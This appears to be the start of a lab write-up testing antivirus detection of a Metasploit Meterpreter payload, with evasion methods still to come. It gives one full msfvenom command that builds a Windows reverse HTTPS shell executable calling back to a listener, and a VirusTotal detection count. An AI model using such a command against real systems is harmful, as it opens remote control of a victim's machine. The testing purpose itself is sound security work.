The purpose of this document is to check the ability of the antivirus to detect a meterpreter binary. For this purpose I
will try different methods described in the mentioned PDF. Some of these methods may have become obsolete by antivirus
updates since this document was published in 2014. However, it is also possible that some evasion techniques are still
effective against current antiviruses. Therefore, it will be interesting to test these different methods and see if
current antivirus programs can detect a meterpreter payload. It is indeed quite likely that most modern antivirus
programs will be able to detect the meterpreter binary, given that it is known to be used in computer attacks. However,
it is important to note that the detection of software as malicious does not necessarily mean that it will be blocked or
removed by the antivirus. It is possible that an antivirus program may detect the meterpreter binary but not have the
ability to remove it, or ask the user for confirmation before doing so. It is also possible that some versions of
meterpreter are more effective than others at going undetected by antivirus software. In any case, it is important to
continue testing and evaluating the ability of antivirus software to detect this kind of software in order to ensure the
security of our systems.



Step 1
______

- I start my test with a simple binary generated by metasploit.

        ```bash
        msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f exe -o step1.exe
          ```

Without surprise 53 AV out of 71 detect it :[Link VirusTotal](https://www.virustotal.com/gui/file/e787031fe8dcc781680e35184f67ea767a08cbab41de70ed3ae04c3f106887da?)
